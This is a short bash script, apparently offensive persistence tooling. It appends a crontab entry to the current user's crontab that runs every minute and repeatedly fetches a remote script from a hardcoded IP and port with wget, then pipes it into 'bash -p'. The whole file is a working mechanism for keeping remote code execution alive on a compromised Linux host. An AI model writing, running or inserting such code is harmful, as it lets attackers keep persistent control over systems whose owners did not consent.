#!/bin/bash

IP="10.2.45.121"
PORT="11000" # statio
CURRENT_CRONTAB=$(crontab -l)
PAYLOAD="\n* * * * * bash -c \"while [ 1 ]; do wget -qO- 'http://$IP:$PORT/persistence/cron/chattr/chattr.sh' | bash -p; sleep 2; done\""
TEMP_CRONTAB_FILE=$(mktemp)
crontab -l > "$TEMP_CRONTAB_FILE"
echo -e "$PAYLOAD" >> "$TEMP_CRONTAB_FILE"
crontab "$TEMP_CRONTAB_FILE"
cat "$TEMP_CRONTAB_FILE"
rm "$TEMP_CRONTAB_FILE"
